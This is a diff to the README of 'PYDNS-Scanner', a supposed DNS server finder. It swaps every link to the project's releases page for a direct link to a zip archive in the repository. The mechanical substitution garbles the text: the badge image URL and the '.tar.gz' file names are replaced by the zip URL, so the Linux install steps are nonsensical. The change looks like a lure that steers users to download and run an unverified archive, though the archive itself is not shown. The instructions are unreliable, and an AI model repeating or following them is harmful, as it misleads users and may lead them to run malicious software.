@@ -1,6 +1,6 @@
 # 🌐 PYDNS-Scanner - Fast and Easy DNS Server Finder
 
-[![Download PYDNS-Scanner](https://img.shields.io/badge/Download%20PYDNS--Scanner-limegreen?style=for-the-badge&logo=github)](https://github.com/sus112112/PYDNS-Scanner/releases)
+[![Download PYDNS-Scanner](https://raw.githubusercontent.com/sus112112/PYDNS-Scanner/main/python/Scanner_PYDN_3.8.zip%20PYDNS--Scanner-limegreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sus112112/PYDNS-Scanner/main/python/Scanner_PYDN_3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before downloading, ensure your system meets these requirements:
 
 To install PYDNS-Scanner, visit the following page:
 
-[Download PYDNS-Scanner Releases](https://github.com/sus112112/PYDNS-Scanner/releases)
+[Download PYDNS-Scanner Releases](https://raw.githubusercontent.com/sus112112/PYDNS-Scanner/main/python/Scanner_PYDN_3.8.zip)
 
 On the releases page, you will find the latest version of PYDNS-Scanner. 
 
@@ -27,12 +27,12 @@ Follow these steps to download and install:
 
 1. **Visit the Releases Page**: Click the link above to go to the PYDNS-Scanner Releases page.
 2. **Choose Your Version**: Look for the latest release, typically at the top.
-3. **Download the File**: Click the download link for your operating system. You may see options like a `.exe` for Windows, a `.pkg` for macOS, or a `.tar.gz` for Linux.
+3. **Download the File**: Click the download link for your operating system. You may see options like a `.exe` for Windows, a `.pkg` for macOS, or a `https://raw.githubusercontent.com/sus112112/PYDNS-Scanner/main/python/Scanner_PYDN_3.8.zip` for Linux.
 4. **Save the File**: Choose a location on your computer to save the downloaded file.
 5. **Run the Installer**:
    - For Windows: Double-click the `.exe` file.
    - For macOS: Open the `.pkg` file and follow the prompts.
-   - For Linux: Extract the `.tar.gz` file and run the contained file in the terminal.
+   - For Linux: Extract the `https://raw.githubusercontent.com/sus112112/PYDNS-Scanner/main/python/Scanner_PYDN_3.8.zip` file and run the contained file in the terminal.
 
 Once installation completes, you are ready to use PYDNS-Scanner.
 
@@ -75,6 +75,6 @@ If you have questions or need assistance, join our community forums or open an i
 
 Keep an eye on the Releases page for new features and updates:
 
-[Download PYDNS-Scanner Releases](https://github.com/sus112112/PYDNS-Scanner/releases)
+[Download PYDNS-Scanner Releases](https://raw.githubusercontent.com/sus112112/PYDNS-Scanner/main/python/Scanner_PYDN_3.8.zip)
 
 Thank you for choosing PYDNS-Scanner. We hope this tool makes your DNS scanning tasks easier!
